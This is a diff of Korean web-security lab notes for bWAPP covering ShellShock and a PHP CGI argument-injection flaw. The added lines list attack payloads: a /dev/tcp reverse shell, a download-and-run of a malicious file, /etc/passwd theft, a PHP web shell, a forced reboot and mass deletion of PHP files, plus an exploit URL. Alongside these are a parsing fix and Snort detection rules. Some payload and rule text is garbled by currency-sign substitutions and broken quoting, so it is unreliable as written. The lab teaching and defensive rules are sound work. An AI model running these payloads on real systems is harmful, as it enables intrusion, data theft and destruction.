@@ -1091,33 +1091,51 @@ Referer: () { :;}; echo "Vulnerable bWAPP:"" $(/bin/sh -c "cat /etc/passwd")
 ```
 
 **ShellShock 취약점 추가 공격 패턴**
+```
+리버스 셸 연결 : /bin/bash -i > /dev/tcp/localhost/8081 0>&1
+악성파일 다운 : wget -O /tmp/syslogd http://localhost/prog; chmod 777 /tmp/syslogd: /tmp/syslogd;
+시스템 상태 체크 : /bin/ping -c localhost
+계정 탈취 : /bin/cat /etc/passwd > dumped_file
+웹 셸 생성 : echo ₩"<? ₩₩$cmd = ₩W$_REQUEST[₩₩₩"cmd₩₩₩"]; if(₩₩$cmd != ₩₩₩" ₩₩₩") print Shell_Exec(₩₩$cmd;?>₩"> ../../p.php & o
+시스템 재시작 : /bin/bash -c ₩"reboot₩"
+PHP 소스 삭제 : find / -name *. php | xargs rm -rf
+```
 
-공격 | 삽입 명령어
+**ShellShock 취약점 대응 방안**
+- 환경변수 처리 시 함수 선언문인지 확인하고 명령어 처리 횟수(반복문 횟수)를 1회로 제한하여 parse_and_execute() 함수를 호출
 
-리버스 셸 연결 | /bin/bash -i > /dev/tcp/localhost/8081 0>&1
+- alert tcp any any -> any any (msg:" Bash_code_injection_cat"; content:"|28 29 20 7b|"; content:"|55 73 65 72 2d 41 67 65 6e 74 3a 20|"; content:"|60 61 74|"; nocase; )
+- alert tcp any any -> any any (msg:" Bash_code_injection_passwd"; content:"|28 29 20 7b|"; content:""|55 73 65 72 2d 41 67 65 6e 74 3a 20|"; content:|70 61 73 73 77 64|"; nocase; )
+- alert tcp any any -> any any (msg:" Bash_code_injection_ping"; content:"|28 29 20 7b|"; content:"|55 73 65 72 2d 41 67 65 6e 74 3a 20|"; content:"|70 69 6e 67|"; nocase; )
 
-악성파일 다운
+---
 
-시스템 상태 체크
+### 기타 주요 웹 취약점 - PHP CGI 취약점 이해 및 실습
 
-계정 탈취
+**PHP CGI 취약점 개요**
+- PHP 5.4.12 이전 버전의 sapi/cgi/cgi_main.c에서 CGI 스크립트가 질의 문자열을 제대로 처리하지 못해 발생
+```
+-n옵션: php.ini 파일을 사용하지 않음
+-s옵션: Source를 색을 입혀 보여주는 옵션
+-d옵션: php.ini에 정의된 설정 내용을 임의 설정
+```
+- Body로 임의의 코드를 대입하면 클라이언트 측에서 원하는 php코드를 실행
+```
+allow_url_fopen=1 : 외부의 URL로부터 파일을 읽어옴
+allow_url_include=1 : 외부의 파일을 include, include_once, require, require_once와 같은 파일로 include 허용
+auto_prepend_file=php://input : Http Request Body로부터 data를 가져와 실행
+```
+```
+/bWAPP/admin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input
+<?php $output = shell_exec('cat /etc/passwd'); echo "$output"; die;
+```
 
-웹 셸 생성
+---
 
-시스템 재시작
-
-PHP 소스 삭제
+### 기타 주요 웹 취약점 - XML Xpath Injection
 
 
 
-wget -O /tmp/syslogd http://localhost/prog; chmod 777 /tmp/syslogd: /tmp/syslogd;
-/bin/ping -c localhost
 
-/bin/cat /etc/passwd > dumped_file
 
-echo W" <? ₩W$cmd = ₩W$_REQUEST[WWW"cmdwww"]; if(ww$cmd != www"
-₩WW") print Shell_Exec(₩₩$cmd ;? >₩"> .. / .. /p.php & o
 
-/bin/bash -c ₩"reboot₩"
-
-find / -name *. php | xargs rm -rf
